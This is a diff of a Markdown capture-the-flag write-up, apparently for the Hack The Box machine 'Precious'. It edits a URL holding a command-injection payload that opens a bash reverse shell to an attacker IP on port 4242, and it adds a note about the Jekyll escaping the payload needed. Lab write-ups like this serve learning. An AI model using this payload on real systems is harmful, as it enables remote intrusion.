@@ -79,9 +79,11 @@ So I just need to tack a reverse shell onto the end of the url that I have the w
 ![listener](/docs/assets/images/HTB/precious/precious19.png)
 
 ```
-  http://10.129.79.142/?name=#{%20'bash -c "bash -i >& /dev/tcp/10.10.14.16/4242 0>&1"'}
+  http://10.129.79.142/?name=#{\%20'bash -c "bash -i >& /dev/tcp/10.10.14.16/4242 0>&1"'}
 ```
 
+\*Jekyll really does not like the url encoded space in that payload, there is no escape character in the payload itself but I couldn't figure out how else to get jekyll to accept it when building out the page. 
+  
 The reverse shell was found on [payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 ![reverse shell](/docs/assets/images/HTB/precious/precious18.png)
